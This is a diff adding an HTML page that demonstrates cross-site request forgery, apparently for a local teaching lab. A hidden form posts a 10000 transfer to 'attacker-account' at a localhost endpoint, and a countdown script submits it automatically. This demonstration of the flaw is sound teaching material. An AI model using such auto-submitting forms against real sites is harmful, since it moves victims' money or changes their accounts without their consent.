@@ -1,0 +1,39 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Evil CSRF Demo</title>
+  <style>
+    body { font-family: ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, sans-serif; max-width: 720px; margin: 3rem auto; padding: 0 1rem; line-height: 1.5; }
+    .box { border: 1px solid #ddd; border-radius: 8px; padding: 1rem; background: #fafafa; }
+  </style>
+</head>
+<body>
+  <h1>Evil Page</h1>
+  <p>This page auto-submits a hidden form to the vulnerable transfer endpoint.</p>
+
+  <div class="box">
+    <p>If the victim is already logged in to the target app, this request can execute using the victim session cookie.</p>
+  </div>
+
+  <form id="attack" action="http://localhost:3000/transfer" method="POST" style="display:none;">
+    <input type="hidden" name="amount" value="10000" />
+    <input type="hidden" name="to" value="attacker-account" />
+  </form>
+
+  <p>Submitting attack request in <span id="sec">2</span>s...</p>
+
+  <script>
+    let remaining = 2;
+    const timer = setInterval(() => {
+      remaining -= 1;
+      document.getElementById('sec').textContent = String(Math.max(remaining, 0));
+      if (remaining <= 0) {
+        clearInterval(timer);
+        document.getElementById('attack').submit();
+      }
+    }, 1000);
+  </script>
+</body>
+</html>
